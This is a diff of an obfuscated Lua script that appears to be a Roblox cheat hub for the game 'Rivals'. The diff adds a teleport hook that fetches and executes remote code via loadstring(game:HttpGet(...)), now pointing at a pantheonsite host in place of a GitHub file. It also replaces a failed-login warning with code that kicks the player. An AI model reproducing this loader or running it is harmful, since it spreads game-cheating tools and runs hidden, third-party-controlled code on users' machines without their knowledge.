@@ -1,8 +1,3 @@
--- ===================================================
---  Nova Hub
---  Discord: https://discord.gg/WmGx944myQ
--- ===================================================
-
 function c_n(a)
 	local v1, v2, v3 = ipairs(a)
 
@@ -295,8 +290,9 @@ if v31 then
 end(v10, v9)
 
 	if v33 then
-		warn("Invalid login, please visit Discord for help.")
-	    return
+		local v35 = game:GetService("Players")
+		v35.LocalPlayer:Kick("Le va to mal el pc a este tio.")
+		wait(99999999999)
 	end
 
 end
@@ -309,7 +305,7 @@ function()
 	if not v36.executed then
 		_u0:Notify({
 			Title = "Notification",
-			Content = "Already injected bitch.",
+			Content = "Already Injected.Dont load twice.",
 			SubContent = "",
 			Duration = 5,
 		})
@@ -416,7 +412,7 @@ end
 
 v54 = getgenv()
 v54.wapp = "https://dev-8-bit.pantheonsite.io/"
-queue_on_teleport('\r\n    if game.PlaceId == 17625359962 or game.PlaceId == 71874690745115 then\r\n        if not getgenv().NameLoaderLoaded then\r\n            getgenv().NameLoaderLoaded = true\r\n            wait(2)\r\n            loadstring(game:HttpGet("https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/located.lua"))()\r\n        end\r\n    end\r\n')
+queue_on_teleport('\r\n    if game.PlaceId == 17625359962 or game.PlaceId == 71874690745115 then\r\n        if not getgenv().NameLoaderLoaded then\r\n            getgenv().NameLoaderLoaded = true\r\n            wait(2)\r\n            loadstring(game:HttpGet("https://dev-8bitsforya.pantheonsite.io/nan.lua"))()\r\n        end\r\n    end\r\n')
 local v56 = v33:CreateWindow(390)
 v54 = v33:CreateWindow(v33, {
 	Title = '                        <font size="15">Rivals</font> V4<font color="#a3fcff" transparency="0.5"> [Feather]</font>',
